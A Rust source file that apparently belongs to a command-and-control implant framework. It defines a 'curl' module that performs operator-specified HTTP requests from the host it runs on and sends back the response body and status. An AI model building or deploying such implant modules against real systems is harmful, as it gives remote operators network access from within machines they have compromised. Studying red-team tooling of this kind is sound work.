use crate::prelude::*;
use async_trait::async_trait;
use malefic_gateway::module_impl;
use std::io::Read;

pub struct Curl {}

#[async_trait]
#[module_impl("curl")]
impl Module for Curl {}

#[async_trait]
impl ModuleImpl for Curl {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let request = check_request!(receiver, Body::CurlRequest)?;

        let mut req = ureq::request(&request.method, &request.url);

        for (key, value) in &request.header {
            req = req.set(key, value);
        }

        let response = if request.body.is_empty() {
            req.call()
        } else {
            req.send_bytes(&request.body)
        }
        .map_err(|e| anyhow::anyhow!("{}", e))?;

        let status = response.status();
        let mut buf = Vec::new();
        response.into_reader().read_to_end(&mut buf)?;

        Ok(TaskResult::new_with_body(
            id,
            Body::BinaryResponse(malefic_proto::proto::modulepb::BinaryResponse {
                data: buf,
                message: Vec::new(),
                err: String::new(),
                status: status as i32,
            }),
        ))
    }
}
